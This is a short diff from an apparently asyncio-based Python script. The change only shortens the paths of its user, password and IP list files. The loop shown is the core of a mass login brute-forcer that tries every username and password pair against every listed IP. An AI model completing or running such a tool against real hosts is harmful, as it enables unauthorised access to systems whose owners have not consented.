@@ -45,13 +45,13 @@ async def connect(ip, user, password):
 async def start():
     tasks = []
 
-    async with afile('data/users.txt', errors="ignore",
+    async with afile('users.txt', errors="ignore",
                      encoding="utf-8") as users:
         async for user in users:
-            async with afile('data/passwords.txt', errors="ignore",
+            async with afile('passwords.txt', errors="ignore",
                              encoding="utf-8") as passws:
                 async for passw in passws:
-                    async with afile('data/ip.txt', errors="ignore",
+                    async with afile('ip.txt', errors="ignore",
                                      encoding="utf-8") as ips:
                         async for ip in ips:
                             task = asyncio.create_task(
